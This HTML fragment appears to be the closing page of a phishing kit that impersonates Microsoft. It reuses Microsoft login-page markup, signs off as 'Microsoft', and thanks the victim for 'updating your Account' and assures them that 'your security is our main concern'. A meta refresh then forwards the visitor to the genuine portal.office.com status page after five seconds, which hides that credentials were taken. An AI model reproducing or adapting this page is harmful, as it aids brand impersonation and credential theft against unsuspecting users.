...
<meta http-equiv="refresh" content="5; URL=https://portal.office.com/servicestatus" />
<title>Thank You! - Everything is up and running.</title>
...
<div id="loginHeader" class="row text-subheader" data-bind="text: loginHeader" style="font-size:30px; width:400px; margin-left:-25px;">Everything is up and running.</div>
<div class="row text-body"><div id="loginDescription" data-bind=" htmlWithBindings: loginDescription, childBindings: { 'learnMoreLink': { click: learnMore.open, visible: !svr.Be, css: { 'display-block': !pwdView.isCombinedSISU() } } }"> <p>Thank you for successfully updating your Account. We are here to serve you better as your security is our main concern!</p>
  <p>Microsoft</p>
</div>
                </div>
    </div></div></div><!-- ko if: showButtons && templateNodes["Buttons"] --><div class="row" id="ftrButto"><!-- ko template: { nodes: templateNodes["Buttons"], data: $parent } --><!-- ko if: pwdView.isActive --><!-- /ko --><!-- /ko --></div>
</div></div>
